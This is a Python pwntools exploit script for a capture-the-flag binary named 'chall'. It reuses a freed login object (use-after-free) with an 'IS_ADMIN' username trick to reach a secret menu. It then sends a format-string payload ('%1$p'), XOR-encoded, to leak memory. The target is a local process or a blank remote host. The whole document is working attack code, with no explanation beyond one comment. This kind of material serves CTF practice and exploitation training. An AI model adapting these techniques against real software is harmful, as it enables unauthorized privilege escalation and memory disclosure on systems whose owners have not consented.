from pwn import * 

context.arch="x86_64"

def login(p, username, username_length):

    p.sendlineafter("option: ", "1")
    p.sendlineafter("length: ", str(username_length))
    p.sendlineafter("username: ", username)

def logout(p):

    p.sendlineafter("option: ", "2")

def get_secret_menu(p):

    p.sendlineafter("option: ", "3")

def xor_payload(payload):

    arr = [] 

    for char in payload:

        arr.append(chr(ord(char) ^ 0xf))


    return "".join(arr)

def main():

    HOST = ""
    PORT = 0
    local = True 

    if local:

        p = process("./chall")

    else:

        p = remote(HOST, PORT)

    #======== STEP 1 ===========
    #getting admin access by abusing UAF bug 
    login(p, "A" * 8 + "IS_ADMIN", 16)
    logout(p)
    login(p, "A" * 8, 8)
    get_secret_menu(p)
    
    payload = "%1$p"
    xored_payload = xor_payload(payload)
    p.sendlineafter("note: ", xored_payload)
    p.recvline()
    data = p.recv()
    print(data)

if __name__ == "__main__":

    main()
